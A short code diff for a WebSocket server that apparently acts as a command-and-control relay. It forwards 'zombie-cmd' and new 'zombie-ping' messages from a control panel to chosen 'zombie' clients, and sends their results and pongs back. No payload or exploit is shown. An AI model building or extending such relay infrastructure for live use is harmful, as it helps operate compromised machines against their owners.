@@ -39,7 +39,9 @@ webSocketServer.on('connection', function(ws) {
                 controlPanelWs.send(data);
                 break;
             }
-            case 'zombie-cmd': {
+            case 'zombie-cmd':
+            case 'zombie-ping':
+            {
                 let destinationWs = zombies[message.uuid];
                 if(!destinationWs){
                     console.error('ERROR', 'Zombie Websocket with given id was not found', message.uuid);
@@ -52,7 +54,9 @@ webSocketServer.on('connection', function(ws) {
                 destinationWs.send(data);
                 break;
             }
-            case 'zombie-result': {
+            case 'zombie-result':
+            case 'zombie-pong':
+            {
                 if(controlPanelWs.readyState !== WebSocket.OPEN){
                     console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
                     return;
